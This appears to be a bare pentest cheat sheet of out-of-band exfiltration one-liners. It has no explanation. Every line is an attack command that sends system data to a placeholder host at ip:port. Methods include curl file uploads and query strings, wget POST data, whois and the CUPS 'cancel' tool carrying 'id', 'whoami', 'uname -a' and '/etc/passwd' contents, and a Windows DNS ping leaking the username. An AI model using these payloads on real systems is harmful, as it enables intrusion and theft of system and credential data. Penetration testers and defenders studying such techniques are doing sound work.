### Linux

```shell
id|curl ip:port -F file=@-

curl http://xxx.xxx.xx/?id=`id`
```

```shell
wget ip:port --post-data "$(id)"
```

```shell
whois -h ip -p port "`whoami&uname -a`"
```

```shell
cancel -u "$(cat /etc/passwd)" -h ip:port
```

### Windows

ping %USERNAME%.xxx.xx
